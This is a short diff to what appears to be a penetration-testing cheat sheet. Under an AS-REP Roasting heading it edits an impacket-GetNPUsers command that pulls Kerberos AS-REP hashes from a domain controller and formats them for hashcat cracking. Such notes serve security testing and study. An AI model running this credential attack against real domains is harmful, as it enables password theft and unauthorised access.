@@ -26,7 +26,7 @@ AKA.
 AS-REP Roasting
 
 ```shell
-impacket-GetNPUsers -no-pass -usersfile ./users.txt -dc-ip $TARGET_IP $TARGET_DOMAIN/
+impacket-GetNPUsers -no-pass -usersfile users -dc-ip $TARGET_IP $TARGET_DOMAIN/ -format hashcat
 ```
 
 Against single user:
